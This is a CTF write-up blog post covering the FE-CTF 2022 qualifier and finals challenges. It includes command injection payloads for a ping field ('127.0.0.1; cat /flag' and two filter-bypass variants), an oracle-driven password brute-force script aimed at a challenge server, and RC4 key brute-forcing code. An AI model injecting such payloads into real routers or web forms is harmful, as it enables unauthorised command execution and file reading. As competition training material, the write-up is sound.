---
title: "FE-CTF (HackingFromEstonia): Finals and Quals Writeups"
date: 2022-11-28T21:49:35+01:00
description: "Writeups for FE-CTF 2022"
---

# Qualifiers - Dig1
A lot of older routers, have this thing in settings that allows you to ping routers. This input is 
usually just smacked directly into bash, and then executed. Knowing this, we can try command injection
with something as simple as:

```
127.0.0.1; cat /flag
```

`flag{do people still use php?}`

# Qualifiers - Dig2
This is the same type of challenge, except now we don't have spaces. Googling this issue:
https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces

Gives us a payload we can try
```
127.0.0.1;cat${IFS}/flag
```

`flag{who needs to sanitize input anyway?}`

# Qualifiers - Dig3
For the last one we cannot use dollar signs, so we try something else:

```
127.0.0.1;cat<flag
```

`flag{it's not bug, it's a feature}`

# Qualifiers - Hash Uppers Downers
I solved this challenge after the CTF with my friend Mikbrosim. 
We knew what to do, during the CTF - but we were playing from an airport, so we didn't have a lot of time.

We're given some source code, and a remote. Now upon sending a password to the remote, we're told
whether or not the value we sent, hashed, is less than the hash of the password stored on the server.

The charset of the password is as follows:
```c
unsigned char ALPHABET[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789";
```
This is 62 different characters. We know that there's at least 5 characters in the password:
```c
assert(strlen(PASSWORD) <= 5);
```

Assuming that the password is 5 characters then there's `63**5` or `916136543` possible combinations. This is approximately
3.7 bytes, `log256(916136543)=3.7`.

Now we need to figure out how we bruteforce this. The server sleeps one second each try, so bruteforcing 3.7 bytes would take
about the same time as an orbital period of Saturn, 5.5 times the half life of Cobalt-60 or 10603 days. Not very feasible.

Now if we assume we could cut our guesses in half with every guess, we would have `log2(992436543)=29.9`. This is some rough
math that doesn't take a lot of things into consideration, but this should be doable. Of course we still need to check a lot of 
things locally, but we should only need to send around 30 requests to the server. But how can we cut our guesses in half with 
every guess? Well, we're told every time we send a password, if the hash is larger or smaller. This should make one think of
binary search. So we implement this in the C script:

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include "sha1.h"

// main(salt);
int main(int argc, char* argv[]){
    if (argc < 2){
        printf("Usage: Salt!\n");
        exit(-1);
    } 

    unsigned char ALPHABET[] =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz"
                "0123456789";

    unsigned char salt[16];
    unsigned char userhash[SHA1_DIGEST_SIZE];
    unsigned char lowerhash[SHA1_DIGEST_SIZE] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    unsigned char upperhash[SHA1_DIGEST_SIZE] = "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";
   
    memcpy(salt, argv[1], 16);

    int N = sizeof(ALPHABET);
    char guess[6] = {0};
    
    for(int x=0; x<N; x++){
        for(int y=0; y<N; y++){
            for(int z=0; z<N; z++){
                for(int i=0; i<N; i++){
                    for(int j=0; j<N; j++){
                        guess[0] = ALPHABET[x];
                        guess[1] = ALPHABET[y];
                        guess[2] = ALPHABET[z];
                        guess[3] = ALPHABET[i];
                        guess[4] = ALPHABET[j];
                         
                        SHA1_CTX ctx;
                        SHA1_Init(&ctx);
                        SHA1_Update(&ctx, salt, strlen(salt));
                        SHA1_Update(&ctx, guess, strlen(guess));
                        SHA1_Final(&ctx, userhash);
                        
                        int lower_bound = memcmp(lowerhash, userhash, sizeof(userhash));
                        int upper_bound = memcmp(upperhash, userhash, sizeof(userhash));

                        // input is larger than lower bound
                        // and smaller than upper bound 
                        if (lower_bound < 0 && upper_bound > 0){
                            printf("Try sending %s\n", guess);
                        
                            int server_result = getc(stdin);
                            getc(stdin);

                            if (server_result == '<'){
                                memcpy(lowerhash, userhash, SHA1_DIGEST_SIZE);
                                lowerhash[SHA1_DIGEST_SIZE] = '\0';
                            } else if (server_result == '>'){
                                memcpy(upperhash, userhash, SHA1_DIGEST_SIZE);
                                upperhash[SHA1_DIGEST_SIZE] = '\0';
                            } else if (server_result == '='){
                                printf("GOT THE PASS! %s\n", guess);
                            }
                        }
                    }
                }
            }
        }
    }
}

// Compilation
// gcc gen_hash.c sha1.c -O3 
```
And the remote interaction script:
```py
from pwn import *

r = remote("uppers-downers.hack.fe-ctf.dk", 1337)
r.recvline()
salt = r.recvline().split()[-1]

p = process(["./a.out", salt])

while True:
    to_send = p.recvline().split()[-1]
    print(to_send)

    r.sendline(to_send)
    server_result = r.recvline().split()[-1]
    
    p.sendline(server_result)
```

`flag{My h34rt fe3ls l1ke an alligator!}`

A fun fact about this challenge was we originally solved it without optimization
flags for gcc, and using time, we calculated that it took:
```
real    11m7.001s
user    9m49.339s
sys     0m0.325s
```
Now with the O3 flag:
```
real    3m26.973s
user    2m50.014s
sys     0m0.156s
```

# Qualifiers - libnotfound
Upon reversing the binary we see that it wants a shared object
which implements the functions as follows:
```c
// foo.c
int foo_add(int a, int b){
    return a+b;
}
int foo_sub(int a, int b){
    return a-b; 
}
int foo_mul(int a, int b){
    return a*b;
}
int foo_div(int a, int b){
    return a/b;
}
int foo_mod(int a, int b){
    return a%b;
}

// 1. gcc -c -Wall -Werror -fpic foo.c
// 2. gcc -shared -o libfoo.so foo.o
```

Now compiling that to a shared object and setting our library path we have:
```
cave@townie:~/CTF/fe-ctf/libnotfound$ export LD_LIBRARY_PATH=.
cave@townie:~/CTF/fe-ctf/libnotfound$ ./challenge
flag{hello? yes, this is flag}
```

# Qualifiers - Snake Jazz 
I just changed the magic file, after reading the source code, and convincing
myself it was a VM which at some point would refer to some memory to load 
the flag, so i YOLO'd and got the flag:
```py
#!/usr/bin/env python3
import magic;_+___+---+---+-__+++-+_-_+_++_++++-+-_+_++_-__-_-+++-++---\
_+_+-+++-+--++__-++___++++_-+_-+__+-+++_-+-_-_-_+_+++-_+--++-_+_-+_---_\
+_-+--_-++_+_--_--+_++_+__-++-+_++--+__+__++-___++_+_--__-_-__--+--_-_-\
--++__-+-____-_+++-_++---+-__+++++_+-+++-___+_++-__-_--_-_-_--+-+++--_-\
_++______++-+-++_++-_-_+-+-_+++_--__--___-+_+++-++_+-++_-+-+-_+--_++-_-\
-++---+__+_____+__--+_--+++__+--+_+--+___-+++++++_+-+_++_-_+-+__-_++++-\
+-__+_++____+_-+-+-+__+-+_-+--_+++__----++-++-+__+-+----__-+_++__+++_-+\
+_+--+--__--+_++__+--++_+-_-_++-_-+-_+_+__++-++_+++++-__+_---+_+_+-+-__\
++-----++-+--_-_++__+--__++-___-_+-+__+-+__+_---_+++_--+-+-+_++_-+++__+\
+-_--+++++--_+_++_--_-+___-___+++-_++++-++-+_++-++_-+++++_+-__---_-_--_\
-+_-+-__+_--+++_-__+_+_-+-++---+_+-+-+__+++_----_-+_-+-+_-++___---++-__\
+-+_+_+--_+---+++--++__+_-+----_--_+_-+_-+_+-+---++_+++-+_+_____----+-+\
++-+__+--_++--_-___+_+_-+--_++--+++__--+_+_-+_-----+_+_+-___+++-+__-+__\
-+___++-++_+___-+-_+_-_----_--+_+_-___+_____-_+_+_-+--+__-_+++-_-++__-_\
+++-__--++-+++_+_+__+--___-+-_--_-++-+-+-_+ +_++++___--+__-+_--__+_-__+\
____---___++++-+_-+__---__++-++-+-__-+-_-++_----_+-+_+_-__+_+____-_+---\
_+--+-_+----_+--++___--__-+-_-+++-+--_+_+__-+_--++-----+++_-_-+_+_-+-+-\
---+_+-+++__+++_-_--_-+_-+++_-++____--++-__+++_+_+--_----+++--_+__+_-+-\
_--_--_+_++_-+_+-+_--++_+++++_+______---+-+++++__+--_+---_-___+-+_-+--_\
+---+++__-++_+_-++_+---+_+_+-+__+++-+_--_-+___-+_-++__+_+_++-_-___++---\
+_-__-++_+_+----_+_-++___--__+--_-++++++_-++-+-_--++-___-+_+_+--++---++\
+---+__+_-+-+--_--_+__+_-+_+-++--++_+++_+_+_____+---+-+++_+__+--_+_--_-\
___+++_-+--_+_--+++__-_+_+_-++_----+_+-__+__+++-___-_-+_+_-_+-_-+_-+__+\
+-++--_-__+__--_+-+-_+_-__+---_-+_-_+_--___+--+-___+_+_+-+___--+++-++-+\
_+_-+_+++_-+-__+--+_-++-++_++_-+-+---++--+-+__+_+--_--_--_++_+_-+_+-_+-\
-++_+++-+_+_____----+-+++-+__+--_++--_-___+_+_-+--_++--+++__--+_+_-++__\
---+_+_+_+__++++_+--_-+__+_-_-++__-_+-__+_-_---_++_+_-+_--__-+---++-_+-\
++_+_+-+-+---+++_- -+__+_-_+-_-_-- _++-++-_+--_----_-++_-___-++____-++-\
___-_++_+_-_+__--+-+-+_--___+++_+___--_-___++_-_+_-+__+-+-_++-+_+_-__-+\
---+__--------_+_-_--+_____---_+_-+--_+___+++----___-_+_-+-_--++++_-_+_\
+_-+_-+__-++_-+_-_-_-+_-_+-___-_-__+++_-___-__--__+_+-++_--___+-_+++-_-\
_+-+++_++-------_--_+++++_+__-_+_+-__+-+-_-+--_-+_----+------+_+-+-__+-\
--+--+--+__+-++++--_-___-++_-+--___--+++__--+_+_-++__---+_+_+_+__+++-+-\
--_-+____+_-++_-_+--++-_+__+_+_+-+++---+++_-_+__+_-_++--_--_++_-_-+_+-_\
++-__----_--_+_++_-+_--+++-_--+++_--++_+_-++-+_--+_+++__+_+++_+_-__-_-_\
+_+------++--+-+-_-++_+--+++----++-_-++__+_++----_--_---+_-+_++-+--++_+\
--_+_+___-__---+-+-+-+__+-------_-__+_++_-+---__--+++_++_+_+_-+_-_---+_\
+++++__+++++---_-+_+_++_-++_-+-+_++-__++-++---+__++--_++-+---__+_---__-\
__++-+----+_-_+-+-+-+__---+++-+-+__+_-+__--_--_+_++_-+_+-+_--++_+++++_+\
______---+-+++++__+--_+---_-___+-+_-+--_+_+_+++__-++-+-_-_+++--_-++__+-\
+-_-_+_+--_-++_++-+-_-_+-+--_-++_-+-+-_-_+++--_-++__+-+-_-_+_+--_-++_++\
-+-_-_+-+--_-++_-+-+-_-_+++--_-++__+-+-_-_+_+--_-++_++-+-_-_+-+--_-++_-\
+-+-_-_+++--_-++__+-+-_-_+_+--_-++_++-+-_-_+-+--_-+_--+++-_-+_+--_-+__+\
_+_-++_-----++-_+_-+_+_+-++----+++_--+__+_-_+---_--_-+-+_-+_++__--++_++\
-+-_+____-++-++++__-+_-+_-_++-+____+___-__-___-_-+-+__+---++_---++_+-+-\
++_+_-+--_-_-+__++__+_-__++--+_-+---++_--++-+--++_+--__-_+_-++-----+__-\
_____-___++_+_-+-_+++_--+++-++++_+-_++-++_-+___+--+____+-__-__-__+-_-+-\
+__----++_--_-+_+-+-____--+--_++-+_+-__-_++_--+-+_--+_+_+-++_+++--++---\
+_-_-_+__++__- _--_-+_+__+_-++_--+--++-_-_- +_+_+---__--++++_-_+_+_-+_+\
___-++_--_-++-_---_++_+_-_-__--+-_-__--___+-__+___-++____+ +_---_-+__++\
___++-+_+-___-+--+_+_------+-_+_-_-+_-____---_-_-+--___-_+++---++__-_+_\
+___--++++___+_+_-+_____-++_-__-++-_--+_++_+_-____--+-_--_--___+-+_+___\
-+-_+__++_--++-_-+_+----_+_+-__+_--++___--+++_+__+_+_-+-_-_--+_+-+__+_+\
++_++___-_-+_+_-++_-+-+_++__+-_+-+---+-+_-+_+---+--+_---+_+++_+-_--__-+\
_+-_+__++- _-+__+_-+__+_---++_+-__-_+___++++-+++++++_--+_-++-_+_++-+__+\
__-__-_+--_-+-_+--_-+++-+++-__+-_--_-_++_+-+_+--_+__++_+_--------+_+_-+\
-__++++-_+--__-+-__-+-++-+-_+++__+--+_-__++-+_-++++-___++_-_-+--_--_+_-\
-+-_-_-_+---_++_+--+_--__--_--++-_-___++_+--++_+_+---_--+_--+-+_++-++++\
+_---_-_+_++__-+-__++__-_--+-_+-+_+-_-__+-+_-_-+-_++_---_-_+-_++-++---+\
_-_---_++++--__--_++-----_++_+-___--_-_+--+_-++-_-+----_-++++-+____-_--\
___-_+-_+-+-_+_++_++___--++--__++_+__+-_--+__-+_+-_++--+_+--+_+-_-+-_++\
+__+-+-+_-+-+-_--++__-__+_+_++---__-+_+-++---++__+--+--+_-_+_+-+_-__---\
+--+_++__+-++__--_-__+_-_+-+--+-+_+-+++-+--++-_---+++++-++_---_--_++-_+\
-+_++_-++-+_+-_+---__-+_++__-_-+----_-+-_+++_-+++_-_--++-_-+++_+_+-_+--\
--++++-_+__+_------_--___++_-+_+__+--++_+_-++_+___++_---+-+_+++__+--+__\
--_-__-+-+_-+--+-+--+++_--_+_+_-+------+_+++_-__+++__+_--__-_+__+___+_-\
-___++-____-+____-__++-+-+_+__-+-+_+__----+-_+_+_-_++_-____-++_--_+---_\
-_+---__+----+-_+_-+_++-_---+--___++-__+-+++_-+_+-+-_-_+__+----++_-_+_-\
____+--+-_+-__+_+--+__-_--_+-+_+-_+-+++__++_+-___-___++-__+-+_+_-___+-+\
_--__-_++__-__+--_+-++__+_--++-_-_-+_+--_+-_-+_-___++-+-_-_-__+_+---+-+\
-___++++--+--_--_--_-+_+_-+_++_---++_+-__+_+____++---+-+-+-+__+--_++--_\
-__++++_-+--_+_--+++_+-++_+_-++_----+_+++++__+++--_+__-+_-_--+-+-+__+_-\
+--___+_-__----+_+-++_+____+-_+_-__-_+-+_++_+-------__+__+_+-_-_-___+-_\
+-__++_+__++++++__-__-_-_-_+-++++_+__+-_-_+-_-_+---+__+---_---__ +__---\
__-_-_+_-__+-__--+-__+++-____-__-+-_+_+-++--_+__+-___-__-_+-_-___+---+_\
-_-_+___+-++-++++-__---+_-+--+__++_--+--_-+_++_+_-++_-_++_++-___+-++---\
-_-++--_++_+---__+_--+__-__--++__-+-+_++--+-+_+--++--_---++--__+-+---__\
++_++__-__+++--_-+--+_+_-++++__--++-_+_-+_+_+-++----+++_--+__+_-_+---_-\
-_-+-+_-+_++__--++_+--++_+___-_----+-+-+_+__+----+--_-__+_-+_-+---_---+\
++_++-_++_-+_----_+++__++_-_-___+--++-_-__+_+_+--_----+++_+-+__+_--+-+-\
_--__+---_+-++--+_----__+--++__-+-+_+__++++---+-+---+__+---+_--_-__+_++\
_-+---__--+++_++_+_+_-+_-_---+_+++++__+++--_+__-+_-_--+-+-++__+++--_-+_\
--_--__+-+_-+_+++_--++_+_-_+_+___-__---+-+_+-+__+----+--_-__-_++_-+----\
_--+++_-+++_+_-+_-----+_+-+_+__+++++_--_-+__-_+_-++_+-_--++-___++_+_+-+\
__+--+++---+-+-+___-_--+++---_-_+_-+_+-_+___++-__-+_++_-_+-+++++----+-_\
++++__++_+__+__-+_--_---+-+--_++_++-+-_+-_+_-+-_--_-+___++_--_--+-+_++-\
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-__++_+_++\
+++--+--_-_-_+-_+--++_--_---___+--_-+---+++_++-++_-+-+------+--__-+_--+\
+--++_-_---_-_-___-+-+_-+-+-+--_+-_+_-+--+_-___++--___-++_+___+-+_+++--\
--+_++-__+_+_-__+_-+--+-_+-___-_-+++__+___-+-+-+___+-+-+-++----+-_+_-++\
+++_++-_++__-_-___---+_++--+__+_-+_+-__--_+-++-_--+---+__+-+___-+-+++-_\
+_-+-_-+++-___++++++__+++-_-+--+-_+-_+-+--_--++--__-+_--++--+-+_-+--_-+\
_++-++++__----_-_--+++_--++__--_+__-_++_-_____+-_+++++--_--_-_--__+--+-\
-+__-__+_++-+--+--------_-+---------_+-++----+---++-_+-+---++_--_++++++\
_-++++-+--_+--+-+-+-+-_---_++_-_+--+_+_+_+-_--_++_+--_-+---_+--+-------\
_+-+-+-__-+-++--__---+-_--++_-__+--_+---+--___+--------+-+_+++++_-_-+--_
```

And we get the flag:
```

                      .
                        `:.
                          `:.
                  .:'     ,::
                 .:'      ;:'
                 ::      ;:'
                  :    .:'
                   `.  :.
          _________________________
         : _ _ _ _ _ _ _ _ _ _ _ _ :
     ,---:".".".".".".".".".".".".":
    : ,'"`::.:.:.:.:.:.:.:.:.:.:.::'
    `.`.  `:-===-===-===-===-===-:'
      `.`-._:                   :
        `-.__`.               ,'
    ,--------`"`-------------'--------.
     `"--.__                   __.--"'
            `""-------------""'

Please eflag{it's, it's a device Morty!} 㰼㎠㎠㍡V{R
```

# Finals - Hexor 1
Now initially when I figured out how to solve this, I just
gave it some input, and noticed that I could change the input
and the output kept being the same. I figured out that only the
first character made a difference in the output, meaning that we
have `256**1` different possible keys, and that's just bruteforcing
one character. But where is this evident in the code?

```c
const char *key = argv[1];
/* Initialize encryption context */
struct rc4_ctx ctx;
rc4_init(&ctx, *key);
```
We initially get the key correctly, however we give `rc4_init`
a pointer to key, essentially this is `**argv[1]`. We can illustrate:
```
argv[1] = secret_key
*key -> secret_key
**key -> s
```
We remember that pointers can also be written as `key[]` so we can write something like:
```
argv[1] = secret_key
key[0] = argv[1] = secret_key
key[0][0] = secret_key[0] = s
```

We can implement a quick and dirty bruteforce in python:
```py
import subprocess

for n in range(1, 256):
    p1 = subprocess.Popen(["cat", "flag.bin"], stdout=subprocess.PIPE)
    p2 = subprocess.check_output(["./hexor", chr(n)], stdin=p1.stdout)

    if b"flag{" in p2:
        print(p2)
```

`flag{8 bit security is not a lot of security}`

# Finals - Hexor 2 
Immediately we should notice that we're given a new and specific
32-bit gcc line: `gcc -Wall -Wextra -Wpedantic -m32 -O2 hexor.c -o hexor`

We see that it also defines this in the top of the file:
```c
#define array_length(x) ((size_t) sizeof(x) / sizeof(x[0]))
```
This takes the overall size and divides it with the first element, now it uses the 
size_t which is of the unsigned integer type. However this is now 32-bit, meaning
that this will return a different size.
32-bit:
```
cave@townie:~/CTF/fe-ctf/finals/hexor-2$ ./hexor lololol < flag.bin
Length of key: 7
This is the length returned by array_length: 4
```
64-bit:
```
cave@townie:~/CTF/fe-ctf/finals/hexor-2$ ./hexor lololol < flag.bin
Length of key 7
This is the length: 8
```

So in our 32-bit version we have to bruteforce 4 bytes, this is feasible. So
that's what we did.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define u8 uint8_t
#define u16 uint16_t
#define u32 uint32_t
#define u64 uint64_t

#define array_length(x) ((size_t)sizeof(x) / sizeof(x[0]))

struct rc4_ctx
{
    u8 S[256];
};

void swap(u8 *a, u8 *b)
{
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int rc4_init(struct rc4_ctx *ctx, const u8 *key)
{

    int len = array_length(key);
    int j = 0;

    for (u32 i = 0; i < array_length(ctx->S); i++)
        ctx->S[i] = i;

    for (u32 i = 0; i < array_length(ctx->S); i++)
    {
        j += ctx->S[i] + ((char *)key)[i % len];
        j %= sizeof(ctx->S);

        swap(&ctx->S[i], &ctx->S[j]);
    }

    return 0;
}

int rc4_crypt(struct rc4_ctx *ctx, u8 *buffer, u32 len)
{

    int i = 0, j = 0;

    for (size_t n = 0; n < len; n++)
    {
        i = (i + 1) % array_length(ctx->S);
        j = (j + ctx->S[i]) % array_length(ctx->S);

        swap(&ctx->S[i], &ctx->S[j]);
        int rnd = ctx->S[(ctx->S[i] + ctx->S[j]) % array_length(ctx->S)];

        buffer[n] = rnd ^ buffer[n];
    }
    return 0;
}

int brute_force(char *ciphertext2, int ciphertext_len)
{
    char key[4];
    char *plaintext = malloc(ciphertext_len);

    //char characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    for (int i = 0x20; i < 0x7e; i++)
    {
        printf("Trying key: %d\r", i);
        fflush(stdout);
        for (int j = 0x20; j < 0x7e; j++)
        {
            for (int k = 0x20; k < 0x7e; k++)
            {
                for (int l = 0x20; l < 0x7e; l++)
                {
                    key[0] = i;
                    key[1] = j;
                    key[2] = k;
                    key[3] = l;
                    struct rc4_ctx ctx;
                    rc4_init(&ctx, key);
                    char *ciphertext = malloc(128);
                    memcpy(ciphertext,ciphertext2,128);
                    rc4_crypt(&ctx, ciphertext, ciphertext_len);

                    if (ciphertext[0] == 'f' && ciphertext[1] == 'l' && ciphertext[2] == 'a' && ciphertext[3] == 'g')
                    {
                        printf("key: %s\n", key);
                        printf("plaintext: %s\n", ciphertext);
                        fflush(stdout);
                        return 1;
                    }
                }
            }
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
    char *ciphertext = malloc(128);
    int ciphertext_len = read(STDIN_FILENO, ciphertext, 128);
    // brute force stdin ciphertext
    if (brute_force(ciphertext, ciphertext_len)==1)
    puts("yay");
    else
    puts("Tough luck ):");
    return 0;
}
```

And we get the flag:
```
cave@townie:~/CTF/fe-ctf/finals/hexor-2$ time cat flag.bin | ./sol
key: @AVey: 64
plaintext: flag{yes, 32>8, but still}

yay

real    0m26.800s
user    0m25.040s
sys     0m1.715s
```

We made some assumptions here, that the encryption key was all printable characters
ie. `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`password or:
`62**4=14776336` combinations, which is just a `3` byte bruteforce. Of course 
instead of compiling with the -O2 flag they give us, we compile it with -O3,
so it goes a bit faster.

# Finals - Hexor 3 (Exercise for reader)
This was the last hexor challenge I would say I contributed in solving. As
I spent most of the CTF doing the two browser pwns, which will be a separate post at 
some point. For now let's look at hexor 3:
```c
char *mutable_key = alloca(0x1000);
strcpy(mutable_key, "Salted__");
strncat(mutable_key, argv[1], 0xfff);

/* Initialize encryption context */
const void *key = &mutable_key;
struct rc4_ctx ctx;
rc4_init(&ctx, key);
```
Now we see that at rc4_init they give a pointer to the address of mutable_key,
this is a stack address, so we need to bruteforce this address. We know that 
there's ASLR on the system. We know therefore that there is:
`0x7fffffffffff-0x7ffce0000000=13421772799`, i.e. `log256(13421772799) = 4.2` bytes.

So we write another bruteforcing script, and do this again. This is left as an 
exercise for the reader. Remember -O3. Remember that stack addresses are 8-byte aligned.
It might be interesting to try first bruteforcing with, addresses 0x0, 0x8, etc. Due 
to the fact that this is how the addresses show up in gdb:
```
► 0x5555555551c5 <main+165>    call   rc4_init                <rc4_init>
    rdi: 0x7fffffffdbf0 ◂— 0x0
    rsi: 0x7fffffffdbe8 —▸ 0x7fffffffcbd0 ◂— 'Salted__L'
```

We ended up getting 7th out of 10 qualifying teams for the finals. The two browser pwn
writeups will come at a later time, as I would like it to be a high quality post.
